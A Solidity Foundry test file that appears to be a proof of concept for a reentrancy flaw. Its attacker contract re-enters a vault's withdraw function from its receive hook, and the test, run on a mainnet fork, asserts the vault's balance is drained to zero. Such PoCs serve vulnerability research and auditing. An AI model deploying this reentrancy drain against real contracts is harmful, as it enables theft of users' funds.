// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IVault} from "src/interfaces/IVault.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

/// The PoC's own attack contract, written next to the test. Deploying it and
/// calling it from the test contract is not "running as the deployer".
contract Reenterer {
    IVault immutable vault;

    constructor(IVault v) {
        vault = v;
    }

    function attack() external {
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) vault.withdraw(1 ether);
    }
}

contract HelperAttackTest is Test {
    IVault vault = IVault(0x00000000000000000000000000000000000000A1);
    Reenterer reenterer;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_000_000);
        reenterer = new Reenterer(vault);
        vm.deal(address(reenterer), 1 ether);
    }

    function test_reentrancyDrains() public {
        uint256 before = address(vault).balance;
        reenterer.attack();
        assertLt(address(vault).balance, before);
        _checkDrained();
    }

    function _checkDrained() internal view {
        assertEq(address(vault).balance, 0);
    }
}
